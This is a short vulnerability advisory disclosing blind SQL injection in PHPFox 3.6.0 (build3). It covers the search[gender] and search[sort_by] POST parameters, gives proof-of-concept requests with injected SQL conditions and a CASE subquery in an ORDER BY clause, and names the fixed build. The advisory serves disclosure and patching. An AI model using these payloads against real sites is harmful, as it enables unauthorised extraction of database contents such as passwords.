PHPFox v3.6.0 (build3) Multiple SQL Injection vulnerabilities
------------------------------------------------------------

== Description ==
- Software link: http://www.phpfox.com
- Affected versions: version 3.6.0 (build3) is vulnerable. Other
versions might be affected as well.
- Vulnerability discovered by: Matias Fontanini

== Vulnerabilities ==
When performing POST requests to /user/browse/view_/, the
"search[gender]" and "search[sort_by]" parameters are not correctly
sanitized before being used to construct SQL queries, making them
vulnerable to Blind SQL Injection attacks.

== Proof of concept ==

- For the "search[gender]" parameter, using the condition "1=0" so
that no results are returned:

POST /user/browse/view_/
core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2
and 1=0search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=DESC

- The "search[sort_by]" parameter is inserted in a "order by" clause.
Therefore, an attacker could exploit it by making the application sort
the results based on a different criteria, depending on whether the
query was successful:

POST /user/browse/view_/
core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2&search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=ASC,(case
when (select 1 from dual) then birthday_search else password end)

== Solution ==
Upgrade the product to the 3.6.0 (build6) version. Note that builds 4
and 5 also contain the vulnerability present in the "search[sort_by]"
parameter, but not the other one.
